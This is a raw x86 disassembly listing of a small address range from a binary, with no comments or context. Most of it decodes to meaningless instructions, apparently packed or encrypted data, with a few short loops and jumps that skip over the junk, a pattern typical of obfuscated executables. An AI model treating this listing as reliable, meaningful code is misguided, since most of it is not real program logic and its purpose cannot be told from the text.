  401882:	jae    0x40180b
  401884:	into   
  401885:	adc    eax,DWORD PTR [edx-0x14]
  401888:	in     al,0x25
  40188a:	push   0x5bb997b4
  40188f:	jmp    0x401910
  401891:	mov    eax,0x90459708
  401896:	in     eax,0x4b
  401898:	and    al,0x37
  40189a:	push   edx
  40189b:	std    
  40189c:	push   0xcf489cb1
  4018a1:	jge    0x4018ad
  4018a3:	lods   al,BYTE PTR ds:[esi]
  4018a4:	clc    
  4018a5:	mov    al,ds:0x184b47de
  4018aa:	fwait
  4018ab:	dec    esi
  4018ac:	xchg   edx,eax
  4018ad:	xlat   BYTE PTR ds:[ebx]
  4018ae:	pop    eax
  4018af:	adc    ch,al
  4018b1:	ret    0xfee2
  4018b4:	pusha  
  4018b5:	push   esp
  4018b6:	sbb    dl,BYTE PTR [edi]
  4018b8:	aaa    
  4018b9:	jl     0x40184d
  4018bb:	mov    BYTE PTR [ecx-0x4f],bl
  4018be:	lods   eax,DWORD PTR ds:[esi]
  4018bf:	aad    0x84
  4018c1:	add    BYTE PTR [ecx-0x5cb00b2c],0x51
  4018c8:	mov    WORD PTR [ebx+0x66f88445],cs
  4018ce:	fild   QWORD PTR [ecx+0x7d]
  4018d1:	fcomip st,st(7)
  4018d3:	or     bl,dl
  4018d5:	fild   QWORD PTR [ebx+0x2af518eb]
  4018db:	add    DWORD PTR [edx+0xe],edi
  4018de:	jnp    0x401937
  4018e0:	fcmovnu st,st(7)
  4018e2:	xor    eax,0x6cbaea92
  4018e7:	out    0x66,eax
  4018e9:	outs   dx,DWORD PTR ds:[esi]
  4018ea:	xchg   ecx,eax
  4018eb:	cli    
  4018ec:	jnp    0x40195f
  4018ee:	mov    esp,0xaf315c13
  4018f3:	push   cs
  4018f4:	retf   
  4018f5:	mov    esp,0x8875302d
  4018fa:	mov    esp,0x56886cad
  4018ff:	inc    edi
  401900:	pop    edx
  401901:	mov    eax,0xcd72a281
  401906:	jle    0x4018ab
  401908:	sbb    bl,BYTE PTR [eax]
  40190a:	loope  0x401907
  40190c:	xchg   esi,eax
  40190d:	data16 out 0x12,al
  401910:	push   es
  401911:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401912:	das    
  401913:	outs   dx,DWORD PTR ds:[esi]
  401914:	push   cs
  401915:	jbe    0x401979
  401917:	adc    dh,BYTE PTR [edi]
  401919:	(bad)  
  40191a:	and    cl,dh
  40191c:	jo     0x40192b
  40191e:	idiv   ah
  401920:	adc    al,0x3b
  401922:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401923:	mov    eax,0xee11cc37
  401928:	rcr    BYTE PTR [ebx+0x67],cl
  40192b:	lahf   
  40192c:	js     0x4018da
  40192e:	pop    ss
  40192f:	popa   
  401930:	pop    ebx
  401931:	cmp    dl,ah
  401933:	add    al,0x5b
  401935:	fwait
  401936:	cld    
  401937:	or     al,0x82
  401939:	icebp  
  40193a:	jmp    0xb730008
  40193f:	and    BYTE PTR [eax+0x64],ah
  401942:	xchg   edx,eax
  401943:	rdtsc  
  401945:	sahf   
  401946:	xchg   ebp,eax
  401947:	int    0xd2
  401949:	lds    ebp,FWORD PTR [edi-0x2486e0ce]
  40194f:	mov    dl,0x8b
  401951:	add    al,0x86
  401953:	push   esi
  401954:	push   edi
  401955:	dec    esi
  401956:	in     eax,dx
  401957:	out    0xbe,al
  401959:	sahf   
  40195a:	pop    esp
  40195b:	push   ebp
  40195c:	addr16 dec ebp
  40195e:	pop    ebp
  40195f:	xor    al,0x3f
  401961:	xor    ebp,DWORD PTR [esi]
  401963:	or     BYTE PTR [edx+0x11],bh
  401966:	test   al,0xee
  401968:	ret    0xff77
  40196b:	mov    esp,0x7cb1f216
  401970:	mov    ebp,fs
  401972:	lods   al,BYTE PTR ds:[esi]
  401973:	mov    ebp,0x850d8cfa
  401978:	xor    eax,0x3cef4005
  40197d:	mov    ch,0xb3
  40197f:	lds    edi,FWORD PTR [eax-0x7638fc58]
  401985:	add    DWORD PTR [ebx],ebx
  401987:	leave  
  401988:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40198f:	lea    eax,[ebp-0x14]
  401992:	jmp    0x401c31
  401997:	xlat   BYTE PTR ds:[ebx]
  401998:	ret    
  401999:	ds ret 0xc1da
  40199d:	fcmovnu st,st(1)
  40199f:	loope  0x4019b4
  4019a1:	xchg   ch,dh
  4019a3:	mov    bh,BYTE PTR [ecx+0x182ef4d]
  4019a9:	js     0x401a23
  4019ab:	(bad)  
  4019ac:	jle    0x401a26
  4019ae:	js     0x401938
  4019b0:	adc    BYTE PTR [ebx],ch
  4019b2:	mov    ebx,es
  4019b4:	stos   DWORD PTR es:[edi],eax
  4019b5:	mov    esp,0xcfb47a92
  4019ba:	mov    bl,0xf8
  4019bc:	adc    al,0x95
  4019be:	jge    0x401a37
  4019c0:	adc    al,0x52
  4019c3:	outs   dx,DWORD PTR ds:[esi]
  4019c4:	and    DWORD PTR [edi],esp
  4019c6:	pop    esi
  4019c7:	pop    esi
  4019c8:	pop    eax
  4019c9:	xor    eax,0x3e9f7398
  4019ce:	outs   dx,BYTE PTR ds:[esi]
  4019cf:	js     0x40199b
  4019d1:	lods   eax,DWORD PTR ds:[esi]
  4019d2:	scas   eax,DWORD PTR es:[edi]
  4019d3:	mov    ebx,0xb9d875f4
  4019d8:	stc    
  4019d9:	and    edx,ebp
  4019db:	push   ss
  4019dc:	fwait
  4019dd:	test   DWORD PTR [eax+0xf],ebp
  4019e0:	not    DWORD PTR [edx+0x322d7cb5]
  4019e6:	iret   
  4019e7:	das    
  4019e8:	push   0xffffffbf
  4019ea:	mov    ah,0x6d
  4019ec:	pop    edi
  4019ed:	pop    ebx
  4019ee:	popa   
  4019ef:	jns    0x4019ba
  4019f1:	cmp    cl,BYTE PTR [esi]
  4019f3:	mov    edi,0xa1523cd2
  4019f8:	ror    DWORD PTR [ecx+0x2102f88],1
  4019fe:	ret    
  4019ff:	outs   dx,BYTE PTR ds:[esi]
  401a00:	xchg   ebx,eax
  401a01:	rol    DWORD PTR [eax-0x42d1fb86],0x7f
  401a08:	ret    0x4c45
  401a0b:	aad    0x6a
  401a0d:	(bad)  
  401a0f:	ins    BYTE PTR es:[edi],dx
  401a10:	imul   ebx,edi,0xbbfbf474
  401a16:	sub    eax,0x75b6dd44
  401a1b:	inc    ebx
  401a1c:	js     0x401a6b
  401a1e:	rcr    DWORD PTR [ecx-0x10],1
  401a21:	mov    esi,0xc8aacb0f
  401a26:	mov    al,ds:0xde11c7aa
  401a2b:	pop    edi
  401a2c:	mov    dl,0x19
  401a2e:	fcmovu st,st(1)
  401a30:	adc    eax,0x116626e4
  401a35:	les    edx,FWORD PTR [ecx+0x79d40eb9]
  401a3b:	adc    bh,ah
  401a3d:	xchg   ebx,eax
  401a3e:	adc    al,0xe5
  401a40:	adc    al,0x4d
  401a42:	dec    esi
  401a43:	cmp    BYTE PTR [ebx],dh
  401a45:	adc    al,0x7b
  401a47:	ret    0xa09f
  401a4a:	(bad)  
  401a4b:	sub    al,0xab
  401a4d:	ret    0x5543
  401a50:	sbb    al,0x7a
  401a52:	xchg   edx,eax
  401a53:	arpl   bp,ax
  401a55:	popf   
  401a56:	sahf   
  401a57:	mov    cl,0xed
  401a59:	xor    ch,BYTE PTR [esi]
  401a5b:	inc    ebx
  401a5c:	add    eax,DWORD PTR [ecx-0x415c1e10]
  401a62:	in     eax,0x72
  401a64:	in     eax,0x9a
  401a66:	inc    esp
  401a67:	and    ecx,eax
  401a69:	add    eax,DWORD PTR [ecx+ecx*2-0x68]
  401a6d:	jp     0x401a28
  401a6f:	xor    ebx,edi
  401a71:	push   0x610571cc
  401a76:	retf   0x4128
  401a79:	mov    ch,bh
  401a7b:	fisubr DWORD PTR [ebx+ebp*1-0x2]
  401a7f:	fisubr DWORD PTR [eax-0x28a79cd8]
  401a85:	dec    esp
  401a86:	hlt    
  401a87:	in     eax,dx
  401a88:	ins    DWORD PTR es:[edi],dx
  401a89:	rol    DWORD PTR [esi],0xe4
  401a8c:	cmp    ch,cl
  401a8e:	(bad)  
  401a8f:	xchg   edi,eax
  401a90:	jmp    0xc0a2:0x65829ca1
  401a97:	adc    al,0x7c
  401a99:	clc    
  401a9a:	imul   ecx,DWORD PTR [esi-0x59],0x810ffe30
  401aa1:	adc    eax,0xae706258
  401aa6:	jno    0x401abd
  401aa8:	adc    ebx,ecx
  401aaa:	push   0xf32a3d85
  401aaf:	cmp    esi,esp
  401ab1:	hlt    
  401ab2:	sub    esi,ebx
  401ab4:	push   0xc1fd72ae
  401ab9:	mov    eax,ds:0x1a6c3161
  401abe:	xor    dl,BYTE PTR [ecx+0x7a]
  401ac1:	pop    edi
  401ac2:	xchg   BYTE PTR [eax+0x57],bl
  401ac5:	xor    esi,edx
  401ac7:	add    al,0x29
  401ac9:	push   ds
  401aca:	jle    0x401ae3
  401acc:	popf   
  401acd:	lods   al,BYTE PTR ds:[esi]
  401ace:	jecxz  0x401a94
  401ad0:	mov    esi,0x65fba6b8
  401ad5:	sti    
  401ad6:	cmp    eax,0x8d53ece9
  401adb:	pop    ebx
  401adc:	pop    ebx
  401add:	ror    BYTE PTR ds:0x778e0856,1
  401ae4:	push   ebx
  401ae5:	sbb    cl,dl
  401ae7:	test   BYTE PTR [ecx],cl
  401ae9:	(bad)  
  401aea:	jmp    0xec40:0x5a91b389
  401af1:	jbe    0x401b26
  401af3:	mov    ah,0xab
  401af5:	pusha  
  401af6:	and    BYTE PTR [ecx-0x6560563f],0x67
  401afd:	push   ebp
  401afe:	fidivr WORD PTR ss:[ebp-0x276694e3]
  401b06:	and    eax,0x9bc6ef68
  401b0b:	sbb    bl,BYTE PTR [ebx-0x24f0ecb0]
  401b11:	cld    
  401b12:	packsswb mm4,QWORD PTR [edx-0x5d0e2d51]
  401b19:	imul   esp,DWORD PTR [eax-0x63e527be],0x3fe151a5
  401b23:	xor    BYTE PTR [ebx-0x80],bh
  401b26:	dec    edi
  401b27:	arpl   WORD PTR [ebp+eiz*2-0x5e],cx
  401b2b:	mov    bl,0x94
  401b2d:	add    bl,BYTE PTR [edx]
  401b2f:	xor    eax,0x98dbf7de
  401b34:	les    ecx,FWORD PTR [edi]
  401b36:	pop    ss
  401b37:	data16 out 0x36,al
  401b3a:	stos   DWORD PTR es:[edi],eax
  401b3b:	in     eax,dx
  401b3c:	mov    ch,0xdd
  401b3e:	(bad)  
  401b40:	aam    0xe0
  401b42:	or     DWORD PTR [esi],edx
  401b44:	inc    dh
  401b46:	lahf   
  401b47:	cmp    ebp,0x27cd50ad
  401b4d:	add    al,0x64
  401b4f:	aad    0xea
  401b51:	add    edi,ecx
  401b53:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401b54:	pusha  
  401b55:	ror    BYTE PTR [ebx-0x4e],0xce
  401b59:	les    ecx,FWORD PTR [ebx-0x1f5bfaeb]
  401b5f:	xchg   ecx,eax
  401b60:	mov    bh,0x6c
  401b62:	hlt    
  401b63:	dec    esp
  401b64:	lds    esp,FWORD PTR [eax+0x69]
  401b67:	fidivr WORD PTR [edx-0x5]
  401b6a:	jl     0x401bc4
  401b6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b6d:	mov    ebx,0xcadad6e9
  401b72:	loopne 0x401afa
  401b74:	data16 mov bl,0x7f
  401b77:	leave  
  401b78:	ja     0x401bb6
  401b7a:	daa    
  401b7b:	and    dl,0xab
  401b7e:	imul   ebx,eax,0x2f
  401b81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b82:	in     eax,dx
  401b83:	mov    esi,0x7334b791
  401b88:	xchg   edx,eax
  401b89:	dec    esi
  401b8a:	fcomp  QWORD PTR [ecx-0x5ddb9fd9]
  401b90:	sar    BYTE PTR [ebx-0x287f157f],cl
  401b96:	xor    ebx,0x3bbb4190
  401b9c:	mov    edi,0xfa7e1927
  401ba1:	icebp  
  401ba2:	loop   0x401c12
  401ba4:	popf   
  401ba5:	lds    ecx,FWORD PTR [ebx+esi*8+0x3]
  401ba9:	rol    ah,0xb
  401bac:	cwde   
  401bad:	fiadd  WORD PTR [eax]
  401baf:	pop    ecx
  401bb0:	(bad)  
  401bb2:	xor    BYTE PTR [esi+0x7d],dl
  401bb5:	fistp  DWORD PTR [edx+0x6e5cb77e]
  401bbb:	inc    ebp
  401bbc:	pop    edx
  401bbd:	outs   dx,BYTE PTR ds:[esi]
  401bbe:	pushf  
  401bbf:	mov    esi,0x9a9d8106
  401bc4:	mov    edi,0xd2ad9e92
  401bc9:	arpl   WORD PTR [edx],cx
  401bcb:	cdq    
  401bcc:	sbb    cl,dh
  401bce:	xchg   DWORD PTR [ebx+0x60],ebx
  401bd1:	xchg   edx,eax
  401bd2:	mov    al,0xbd
  401bd4:	and    DWORD PTR [edx-0x69],ebx
  401bd7:	pop    edi
  401bd8:	aaa    
  401bd9:	or     ch,bl
  401bdb:	repnz sub BYTE PTR [ebx],ch
  401bde:	adc    dl,BYTE PTR [bp+di]
  401be1:	xchg   esp,eax
  401be2:	shl    DWORD PTR [esi],0xa9
  401be5:	xor    eax,0xf1ae9ecf
  401bea:	mov    al,0xfd
  401bec:	xchg   DWORD PTR [ecx],ebp
  401bee:	call   0x66722110
  401bf3:	dec    ebp
  401bf4:	push   0xffffffb3
  401bf6:	enter  0xab01,0x5c
  401bfa:	ret    0x870a
  401bfd:	hlt    
  401bfe:	push   edx
  401bff:	mov    eax,ds:0xaddb93b
  401c04:	sbb    bl,BYTE PTR [ebx+0x54636325]
  401c0a:	aam    0xdb
  401c0c:	shl    DWORD PTR [ebx+ebx*4],0xb1
  401c10:	rol    eax,cl
  401c12:	jecxz  0x401bda
  401c14:	push   eax
  401c15:	mov    DWORD PTR [ecx+0x30b5bbee],ecx
  401c1b:	jg     0x401c07
  401c1d:	imul   edi,DWORD PTR [esp+ebx*8-0x5210ae74],0xe9492d76
  401c28:	(bad)  
  401c29:	enter  0xfb9f,0xc5
  401c2d:	jg     0x401ca9
  401c2f:	pop    ecx
  401c30:	inc    ebp
  401c31:	mov    DWORD PTR [ebp-0x20],eax
  401c34:	and    DWORD PTR ds:0x42a83d,0x0
  401c3e:	jmp    0x401c4e
  401c43:	mov    eax,ds:0x42a83d
  401c48:	inc    eax
  401c49:	mov    ds:0x42a83d,eax
  401c4e:	cmp    DWORD PTR ds:0x42a83d,0x18
  401c55:	jae    0x401c9b
  401c5b:	cmp    DWORD PTR ds:0x42a83d,0xa
  401c62:	jne    0x401c7b
  401c68:	push   0x6bd9
  401c6d:	push   DWORD PTR [ebp-0x1c]
  401c70:	push   0x42aa2e
  401c75:	call   DWORD PTR ds:0x41d0bc
  401c7b:	cmp    DWORD PTR ds:0x42a83d,0x9
  401c82:	jne    0x401c96
  401c88:	xor    eax,eax
  401c8a:	xor    eax,DWORD PTR ds:0x42a83d
  401c90:	inc    eax
  401c91:	mov    ds:0x42a83d,eax
  401c96:	jmp    0x401c43
  401c9b:	mov    eax,DWORD PTR [ebp-0x14]
  401c9e:	sbb    DWORD PTR ds:0x42a761,0x47a9
  401ca8:	mov    ecx,DWORD PTR [ebp-0x20]
  401cab:	dec    DWORD PTR ds:0x42a775
  401cb1:	xor    eax,esi
  401cb3:	add    eax,edi
  401cb5:	mov    DWORD PTR [ecx],eax
  401cb7:	movzx  eax,WORD PTR ds:0x42a769
  401cbe:	and    eax,DWORD PTR ds:0x42a7b9
  401cc4:	mov    ds:0x42a769,eax
  401cc9:	mov    eax,ds:0x41ebba
  401cce:	mov    ebx,0x8e12febf
  401cd3:	adc    DWORD PTR ds:0x42a7f9,0x42a801
  401cdd:	mov    DWORD PTR [ebp-0xc],ebx
  401ce0:	xor    DWORD PTR ds:0x42a77d,0x1391
  401cea:	mov    eax,DWORD PTR [eax]
  401cec:	mov    cx,WORD PTR [ebp-0x4]
  401cf0:	movzx  ecx,cx
  401cf3:	jmp    0x401f92
  401cf8:	retf   
  401cf9:	iret   
  401cfa:	cmp    al,0x3d
  401cfc:	aam    0xd1
  401cfe:	leave  
  401cff:	fldcw  WORD PTR [edx-0x16]
  401d02:	retf   0x8eba
  401d05:	test   DWORD PTR [edi-0x21],esp
  401d08:	add    BYTE PTR [esi],al
  401d0a:	js     0x401d84
  401d0c:	(bad)  
  401d0d:	jle    0x401d87
  401d0f:	js     0x401cfc
  401d11:	dec    edi
  401d12:	mov    bl,ch
  401d14:	jge    0x401d37
  401d16:	inc    ebp
  401d17:	pop    ecx
  401d18:	(bad)  
  401d19:	jnp    0x401d00
  401d1b:	adc    dl,al
  401d1d:	js     0x401d0e
  401d1f:	sar    DWORD PTR [edx],0xac
  401d22:	ss adc ebp,ebx
  401d25:	fmul   QWORD PTR [esi-0x8181266]
  401d2b:	dec    ecx
  401d2c:	mov    BYTE PTR [ecx],al
  401d2e:	pop    edx
  401d2f:	or     DWORD PTR [esi-0x25ff8baf],esp
  401d35:	adc    DWORD PTR [ebx],ebp
  401d37:	mov    DWORD PTR [eax+0x12705913],edi
  401d3d:	mov    ch,0xc1
  401d3f:	cs adc al,0x2b
  401d42:	js     0x401cea
  401d44:	adc    dh,BYTE PTR [ebx-0x71]
  401d47:	in     al,dx
  401d48:	xor    bx,sp
  401d4b:	rol    DWORD PTR [edx],1
  401d4d:	add    bh,BYTE PTR [edi]
  401d4f:	(bad)  
  401d50:	outs   dx,DWORD PTR ds:[esi]
  401d51:	int3   
  401d52:	in     eax,dx
  401d53:	adc    BYTE PTR [ebp-0x1d],cl
  401d56:	ss push ds
  401d58:	inc    edi
  401d59:	jle    0x401db9
  401d5b:	icebp  
  401d5c:	jmp    0x401d07
  401d5e:	inc    esi
  401d5f:	push   cs
  401d60:	sbb    al,0xbd
  401d62:	ret    
  401d63:	jae    0x401dc3
  401d65:	adc    eax,0x22df44d
  401d6a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d6b:	out    0xf3,eax
  401d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d6e:	jns    0x401da2
  401d70:	outs   dx,DWORD PTR ds:[esi]
  401d71:	mov    ds:0xf45fe03d,al
  401d76:	or     bh,bh
  401d78:	jnp    0x401cfc
  401d7a:	fimul  DWORD PTR [ecx-0x2d]
  401d7d:	mov    cl,0x26
  401d7f:	cli    
  401d80:	pushf  
  401d81:	(bad)  
  401d82:	stos   BYTE PTR es:[edi],al
  401d83:	jnp    0x401d22
  401d85:	lds    esi,FWORD PTR [ebp+0x22]
  401d88:	sub    DWORD PTR [edi+eax*8-0x65cb9074],esp
  401d8f:	adc    BYTE PTR [edi],dh
  401d91:	stos   BYTE PTR es:[edi],al
  401d92:	mov    edi,0xd7f9275c
  401d97:	push   esi
  401d98:	xor    cl,BYTE PTR [ebx+0x12]
  401d9b:	not    BYTE PTR [ecx+0x12]
  401d9e:	lods   al,BYTE PTR ds:[esi]
  401d9f:	xchg   esi,eax
  401da0:	mov    ebp,DWORD PTR [esi+0x50]
  401da3:	fdiv   DWORD PTR [edx+0x35dce090]
  401da9:	inc    edx
  401daa:	ret    0x3bb0
  401dad:	jo     0x401dc2
  401daf:	pop    es
  401db0:	xchg   esi,eax
  401db1:	pop    eax
  401db2:	jmp    0xbd0e:0xf80d60e0
  401db9:	shl    bh,cl
  401dbb:	adc    ah,ch
  401dbd:	push   0x22
  401dbf:	ret    0xcaa6
  401dc2:	mov    esi,0x5dee1841
  401dc7:	ds adc dl,bl
  401dca:	(bad)  
  401dcb:	enter  0xbb08,0x4d
  401dcf:	push   ds
  401dd0:	xchg   ecx,eax
  401dd1:	cmp    eax,0xe93b7ecf
  401dd6:	js     0x401de9
  401dd8:	rcr    BYTE PTR [esi],cl
  401dda:	pop    es
  401ddb:	adc    ch,bl
  401ddd:	not    DWORD PTR [edi]
  401ddf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401de0:	aam    0xbc
  401de2:	loopne 0x401de7
  401de4:	lea    esi,[edx]
  401de6:	inc    eax
  401de7:	lock xchg ebp,eax
  401de9:	jo     0x401de4
  401deb:	jl     0x401dc4
  401ded:	adc    BYTE PTR [ecx],al
  401def:	fisub  DWORD PTR [edx]
  401df1:	add    eax,0xc1880f62
  401df6:	idiv   edx
  401df8:	or     DWORD PTR [ecx+0x4c],edi
  401dfb:	(bad)  
  401dfc:	(bad)  
  401dfd:	addr16 push esi
  401dff:	dec    ecx
  401e00:	std    
  401e01:	push   ecx
  401e02:	and    ebx,DWORD PTR [edi+0x780073a0]
  401e08:	call   0x91de8164
  401e0d:	push   eax
  401e0e:	jmp    esi
  401e10:	arpl   WORD PTR [eax+ebx*8+0x5a],si
  401e14:	rep stos DWORD PTR es:[edi],eax
  401e16:	(bad)  
  401e18:	xchg   edi,eax
  401e19:	mov    ebp,0xf9882040
  401e1e:	pop    edi
  401e1f:	jnp    0x401e92
  401e21:	rcr    BYTE PTR [esp+ebx*8-0x80],cl
  401e25:	mov    ds:0x8315ae6c,eax
  401e2a:	push   edx
  401e2b:	retw   0xec5f
  401e2f:	or     al,dl
  401e31:	jmp    0x465f:0x41f77f31
  401e38:	rol    DWORD PTR [esi+0xb],cl
  401e3b:	inc    DWORD PTR [ebx-0x41]
  401e3e:	lds    esp,FWORD PTR [eax-0x75b73b0f]
  401e44:	fiadd  WORD PTR [eax-0x3e7ade19]
  401e4a:	mov    ds:0x4b006ec5,eax
  401e4f:	(bad)  
  401e50:	jbe    0x401eb2
  401e52:	jne    0x401eb0
  401e54:	xchg   ecx,eax
  401e55:	mov    BYTE PTR [esi],dh
  401e57:	ret    0xfed5
  401e5a:	enter  0x4e37,0x3
  401e5e:	lahf   
  401e5f:	add    ah,BYTE PTR [ebx-0x31]
  401e62:	pop    esi
  401e63:	mov    ds:0x36efe4ab,eax
  401e68:	push   esi
  401e69:	retf   
  401e6a:	adc    eax,0xc5f5bceb
  401e6f:	xor    BYTE PTR ss:[ebx+ecx*2-0x1c],ch
  401e74:	inc    esi
  401e75:	add    al,0x5c
  401e77:	nop
  401e78:	push   edx
  401e79:	mov    ecx,0x6000d323
  401e7e:	mov    cl,0x1f
  401e80:	fbstp  TBYTE PTR [esi]
  401e82:	(bad)  
  401e83:	repz xchg ecx,eax
  401e85:	jle    0x401eef
  401e87:	in     al,0xca
  401e89:	xchg   edx,eax
  401e8a:	xchg   esp,eax
  401e8b:	pop    ecx
  401e8c:	sbb    eax,DWORD PTR [eax-0x6c]
  401e8f:	jp     0x401eda
  401e91:	xchg   BYTE PTR [edx+0x25],al
  401e94:	xchg   DWORD PTR ds:0x8e9e4a82,edx
  401e9a:	imul   ebx,ecx,0x8b094bb7
  401ea0:	enter  0xc930,0x21
  401ea4:	jge    0x401eb3
  401ea6:	add    BYTE PTR [eax+0x2e545e5c],ah
  401eac:	jns    0x401e77
  401eae:	mov    esi,0x35c1ae21
  401eb3:	jge    0x401f03
  401eb5:	pop    ebp
  401eb6:	test   al,0x69
  401eb8:	push   edi
  401eb9:	xchg   esp,eax
  401eba:	push   ebp
  401ebb:	mov    esp,0x86f009fd
  401ec0:	inc    edx
  401ec1:	in     eax,0x78
  401ec3:	imul   eax,DWORD PTR [esi],0x60
  401ec6:	ins    DWORD PTR es:[edi],dx
  401ec7:	xor    BYTE PTR cs:[edi],dl
  401eca:	or     dh,BYTE PTR [edi+0x6ab8e308]
  401ed0:	xor    al,ch
  401ed2:	adc    eax,0x877a90f8
  401ed7:	clc    
  401ed8:	or     ebx,0xffffff92
  401edb:	mov    cl,0xef
  401edd:	jg     0x401f3a
  401edf:	in     eax,0x26
  401ee1:	inc    ebx
  401ee2:	out    dx,eax
  401ee3:	xor    eax,0x22b944b8
  401ee8:	aaa    
  401ee9:	mov    ds,WORD PTR [ebx-0x70274500]
  401eef:	out    dx,eax
  401ef0:	sub    eax,0x4d7cd035
  401ef5:	in     al,0x8f
  401ef7:	inc    esi
  401ef8:	stos   BYTE PTR es:[edi],al
  401ef9:	jmp    DWORD PTR [edx-0x433aa1d2]
  401eff:	jl     0x401eda
  401f01:	inc    ebx
  401f02:	into   
  401f03:	aad    0x93
  401f05:	(bad)  
  401f06:	iret   
  401f07:	mov    DWORD PTR ds:0xbead1872,esi
  401f0d:	pop    ss
  401f0e:	cmp    BYTE PTR [edx-0x69],cl
  401f11:	dec    esi
  401f12:	jmp    0x5ce8:0x1a9e2684
  401f19:	scas   eax,DWORD PTR es:[edi]
  401f1a:	mov    dh,0x30
  401f1c:	jmp    0x401ebe
  401f1e:	lds    esi,FWORD PTR [ebp+0x53]
  401f21:	mov    DWORD PTR [eax-0x3e66d57a],0xfd4869f7
  401f2b:	mov    ah,0xb2
  401f2d:	xor    al,0x22
  401f2f:	loope  0x401fae
  401f31:	mov    ch,0x43
  401f33:	jns    0x401f2e
  401f35:	lock pushf 
  401f37:	sbb    BYTE PTR [ecx],dl
  401f39:	popf   
  401f3a:	inc    esp
  401f3b:	loope  0x401f1a
  401f3d:	and    DWORD PTR [ebx+edi*1-0x7c],ecx
  401f41:	stc    
  401f42:	fwait
  401f43:	rcr    BYTE PTR [edx],cl
  401f45:	inc    eax
  401f46:	fwait
  401f47:	mov    edi,0x3b04fddd
  401f4c:	add    BYTE PTR [eax+0xa1fb317],ch
  401f52:	xchg   esi,eax
  401f53:	test   al,0x26
  401f55:	in     eax,dx
  401f56:	inc    esp
  401f58:	pusha  
  401f59:	out    0x5,eax
  401f5b:	xchg   DWORD PTR [esi],esi
  401f5d:	lock sti 
  401f5f:	cs inc esp
  401f61:	sub    dh,dh
  401f63:	adc    eax,0x1bc4d9e2
  401f68:	cli    
  401f69:	aaa    
  401f6a:	aas    
  401f6b:	icebp  
  401f6c:	jno    0x401f37
  401f6e:	aam    0x57
  401f70:	push   cs
  401f71:	pop    edx
  401f72:	push   esi
  401f73:	push   esp
  401f74:	jns    0x401f04
  401f76:	les    ebx,FWORD PTR ds:0x592cec3
  401f7c:	dec    ebp
  401f7d:	push   ebx
  401f7e:	xor    DWORD PTR [eax+ecx*8-0x48e5f3f7],edx
  401f85:	mov    al,0xe
  401f87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f88:	fdivp  st(1),st
  401f8a:	add    bl,BYTE PTR [esi-0x1a16ab4a]
  401f90:	mov    dh,0x39
  401f92:	add    ecx,DWORD PTR [eax]
  401f94:	xor    eax,eax
  401f96:	add    eax,DWORD PTR ds:0x42a839
  401f9c:	and    eax,DWORD PTR ds:0x42a889
  401fa2:	mov    ds:0x42a839,eax
  401fa7:	mov    DWORD PTR [ebp-0x18],ecx
  401faa:	add    DWORD PTR ds:0x42a7f1,0x598
  401fb4:	mov    eax,DWORD PTR [ebp+0x8]
  401fb7:	and    DWORD PTR ds:0x42a759,0x0
  401fc1:	jmp    0x401fd3
  401fc6:	mov    ecx,DWORD PTR ds:0x42a759
  401fcc:	inc    ecx
  401fcd:	mov    DWORD PTR ds:0x42a759,ecx
  401fd3:	cmp    DWORD PTR ds:0x42a759,0x11
  401fda:	jae    0x402003
  401fe0:	cmp    DWORD PTR ds:0x42a759,0x1b
  401fe7:	jne    0x401ffe
  401fed:	push   0x275b
  401ff2:	push   DWORD PTR [ebp-0x20]
  401ff5:	push   DWORD PTR [ebp-0x28]
  401ff8:	call   DWORD PTR ds:0x41d184
  401ffe:	jmp    0x401fc6
  402003:	mov    ecx,DWORD PTR [ebp-0x8]
  402006:	jmp    0x4022a5
  40200b:	rcl    cl,0xcf
  40200e:	ret    
  40200f:	fld    st(1)
  402011:	aam    0xd9
  402013:	push   ecx
  402014:	shl    bh,1
  402016:	cmp    DWORD PTR [ecx+ebp*2+0x50],edx
  40201a:	fld    DWORD PTR [esi-0x18787fc]
  402020:	jle    0x40209a
  402022:	js     0x40206b
  402024:	enter  0x1c11,0xd
  402028:	push   esp
  402029:	test   DWORD PTR [esi-0x4f],ebp
  40202c:	push   esi
  40202d:	sti    
  40202e:	jl     0x402033
  402030:	sub    edi,DWORD PTR [edi+eiz*2-0x3eb314a3]
  402037:	scas   al,BYTE PTR es:[edi]
  402038:	idiv   dl
  40203a:	sbb    esi,edx
  40203c:	mov    dl,0xee
  40203e:	and    eax,0x8c56b3ba
  402043:	pop    DWORD PTR [edi-0x3b]
  402046:	in     eax,0x2e
  402048:	pop    edi
  402049:	mov    al,ds:0xf36c7769
  40204e:	dec    BYTE PTR ds:0xab9fbe1e
  402054:	sub    DWORD PTR [esi-0x78a1ab35],ebp
  40205a:	repnz test dl,bh
  40205d:	fisttp WORD PTR [edi+0x38]
  402060:	dec    ebp
  402061:	and    eax,0x1d917327
  402066:	dec    eax
  402067:	(bad)  
  402068:	stos   BYTE PTR es:[edi],al
  402069:	(bad)  
  40206a:	or     al,0xb0
  40206c:	stos   DWORD PTR es:[edi],eax
  40206d:	and    eax,0xe69671f5
  402072:	push   ss
  402073:	retf   
  402074:	aam    0x22
  402076:	mov    bl,bl
  402078:	lahf   
  402079:	dec    eax
  40207a:	fstp   DWORD PTR [ecx]
  40207c:	fwait
  40207d:	push   eax
  40207e:	and    eax,0x513308f5
  402083:	pop    edi
  402084:	mov    bh,bh
  402086:	addr16 mov ?,esp
  402089:	dec    esp
  40208a:	sbb    bh,dh
  40208c:	scas   eax,DWORD PTR es:[edi]
  40208d:	dec    ebp
  40208e:	push   ss
  40208f:	daa    
  402090:	sub    BYTE PTR [edx],al
  402092:	into   
  402093:	cli    
  402094:	popf   
  402095:	scas   al,BYTE PTR es:[edi]
  402096:	sub    DWORD PTR [edx-0x5ad14b73],0x41d03b41
  4020a0:	pop    ebp
  4020a1:	or     DWORD PTR [edi],ecx
  4020a3:	mov    BYTE PTR [ecx],al
  4020a5:	jno    0x40209e
  4020a7:	icebp  
  4020a8:	add    eax,DWORD PTR [edi]
